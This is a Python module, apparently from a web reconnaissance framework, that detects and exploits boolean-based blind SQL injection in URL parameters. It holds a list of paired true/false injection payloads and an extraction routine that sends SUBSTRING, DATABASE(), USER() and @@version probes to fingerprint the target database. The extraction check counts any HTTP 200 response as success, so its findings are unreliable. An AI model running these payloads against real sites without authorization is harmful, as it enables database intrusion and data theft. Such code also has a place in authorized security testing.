"""
modules/boolean_sqli_detector.py - Boolean-based SQL Injection
More reliable than time-based, detects blind SQLi
"""

import json
import logging
from typing import Dict, List, Any, Optional, Callable
from urllib.parse import urljoin, quote
import re

from core.http_engine import HTTPClient

logger = logging.getLogger("recon.boolean_sqli")


class BooleanSQLiDetector:
    """Boolean-based SQL Injection detection and exploitation"""
    
    def __init__(self, output_dir: str, timeout: int = 30):
        self.output_dir = output_dir
        self.timeout = timeout
        self.http_client = HTTPClient(timeout=timeout)
        self.findings_file = f"{output_dir}/boolean_sqli_findings.json"
    
    def detect(
        self,
        url: str,
        parameters: Optional[List[str]] = None,
        progress_cb: Optional[Callable[[str, str, str], None]] = None
    ) -> Dict[str, Any]:
        """Detect Boolean-based SQLi"""
        result = {
            'url': url,
            'tool': 'boolean_sqli',
            'type': 'boolean_sqli',
            'vulnerabilities': [],
            'extracted_data': [],
            'databases_dumped': []
        }
        
        if progress_cb:
            progress_cb('boolean_sqli', 'sqli_detector', 'Testing Boolean SQLi...')
        
        logger.info(f"[BOOL-SQLI] Testing {url}")
        
        if not parameters:
            parameters = self._extract_parameters(url)
        
        if not parameters:
            logger.info(f"[BOOL-SQLI] No parameters found on {url}")
            return result
        
        # Get baseline response
        try:
            baseline = self.http_client.get(url)
            baseline_len = len(baseline.text)
            baseline_content = baseline.text
        except Exception as e:
            logger.error(f"[BOOL-SQLI] Baseline request failed: {e}")
            return result
        
        # Test each parameter
        for param in parameters:
            if progress_cb:
                progress_cb('boolean_sqli', 'sqli_detector', f'Testing {param}...')
            
            vulns = self._test_parameter(url, param, baseline_len, baseline_content)
            result['vulnerabilities'].extend(vulns)
            
            if vulns:
                logger.info(f"[BOOL-SQLI] Found {len(vulns)} vulns on {param}")
                
                # Try to extract data
                for vuln in vulns:
                    data = self._extract_database(url, param, vuln)
                    if data:
                        result['extracted_data'].append(data)
        
        try:
            with open(self.findings_file, 'w') as f:
                json.dump(result, f, indent=2)
        except Exception as e:
            logger.error(f"[BOOL-SQLI] Error saving: {e}")
        
        if progress_cb:
            success_count = len(result['vulnerabilities'])
            progress_cb('boolean_sqli', 'sqli_detector', f'Found {success_count} Boolean SQLi')
        
        return result
    
    def _test_parameter(self, url: str, param: str, baseline_len: int, baseline_text: str) -> List[Dict]:
        """Test single parameter for Boolean SQLi"""
        vulns = []
        
        # Boolean-based payloads
        payloads = [
            # Basic AND/OR
            ("' AND '1'='1", "' AND '1'='2"),
            ("1' AND '1'='1", "1' AND '1'='2"),
            ("1 AND 1=1", "1 AND 1=2"),
            
            # Comment-based
            ("' AND '1'='1' -- -", "' AND '1'='2' -- -"),
            ("1' AND 1=1 -- -", "1' AND 1=2 -- -"),
            
            # UNION (returns different result)
            ("1' UNION SELECT 1,1,1 -- -", "1' UNION SELECT 0,0,0 -- -"),
            
            # Database function
            ("' AND DATABASE() LIKE '%' -- -", "' AND DATABASE() LIKE 'IMPOSSIBLE' -- -"),
            ("' AND USER() LIKE '%' -- -", "' AND USER() LIKE 'IMPOSSIBLE' -- -"),
            
            # Numeric
            ("1 OR 1=1", "1 OR 1=2"),
            ("999999 OR 1=1", "999999 OR 1=2"),
        ]
        
        for true_payload, false_payload in payloads:
            try:
                # Test TRUE condition
                true_url = self._inject_parameter(url, param, true_payload)
                true_resp = self.http_client.get(true_url, timeout=self.timeout)
                true_len = len(true_resp.text)
                true_text = true_resp.text
                
                # Test FALSE condition
                false_url = self._inject_parameter(url, param, false_payload)
                false_resp = self.http_client.get(false_url, timeout=self.timeout)
                false_len = len(false_resp.text)
                false_text = false_resp.text
                
                # Compare responses
                len_diff = abs(true_len - false_len)
                content_diff = self._get_content_diff(true_text, false_text)
                
                # Significant difference indicates SQLi
                if len_diff > 50 or content_diff > 0.3:
                    # Use float confidence so downstream report generation works correctly
                    confidence_val = 0.75 if len_diff > 100 else 0.50
                    vulns.append({
                        'parameter': param,
                        'type': 'boolean_based',
                        'true_payload': true_payload,
                        'false_payload': false_payload,
                        'confidence': confidence_val,
                        'difference': {
                            'length_diff': len_diff,
                            'content_diff': f"{content_diff:.1%}"
                        }
                    })
                    logger.info(f"[BOOL-SQLI] FOUND on {param}: len_diff={len_diff}, content_diff={content_diff:.1%}")
                    break
            
            except Exception as e:
                logger.debug(f"[BOOL-SQLI] Payload test failed: {e}")
        
        return vulns
    
    def _extract_database(self, url: str, param: str, vuln: Dict) -> Optional[Dict]:
        """Extract database info via Boolean SQLi"""
        try:
            true_payload = vuln['true_payload']
            
            # Get database name
            db_payloads = [
                "' AND SUBSTRING(DATABASE(),1,1)='p' -- -",
                "' AND SUBSTRING(USER(),1,1)='r' -- -",
                "' AND @@version LIKE '5%' -- -"
            ]
            
            db_info = {}
            for payload in db_payloads:
                try:
                    test_url = self._inject_parameter(url, param, payload)
                    resp = self.http_client.get(test_url, timeout=10)
                    if resp.status_code == 200:
                        db_info['test'] = 'passed'
                except:
                    pass
            
            if db_info:
                return {
                    'url': url,
                    'parameter': param,
                    'type': 'database_info',
                    'info': db_info
                }
        
        except Exception as e:
            logger.debug(f"[BOOL-SQLI] Extract failed: {e}")
        
        return None
    
    def _get_content_diff(self, text1: str, text2: str) -> float:
        """Calculate content difference ratio"""
        if not text1 or not text2:
            return 0.0
        
        # Simple diff: measure unique lines
        lines1 = set(text1.split('\n')[:20])
        lines2 = set(text2.split('\n')[:20])
        
        if len(lines1) + len(lines2) == 0:
            return 0.0
        
        diff = len(lines1 ^ lines2) / (len(lines1) + len(lines2))
        return diff
    
    def _extract_parameters(self, url: str) -> List[str]:
        """Extract parameters from URL"""
        params = []
        if '?' not in url:
            return params
        
        query_string = url.split('?', 1)[1]
        for pair in query_string.split('&'):
            if '=' in pair:
                param, _ = pair.split('=', 1)
                params.append(param)
        
        return params
    
    def _inject_parameter(self, url: str, param: str, payload: str) -> str:
        """Inject payload into URL parameter"""
        if '?' not in url:
            return url + f"?{param}={quote(payload)}"
        
        if param in url:
            import re
            pattern = rf"{param}=[^&]*"
            return re.sub(pattern, f"{param}={quote(payload)}", url)
        else:
            return url + f"&{param}={quote(payload)}"
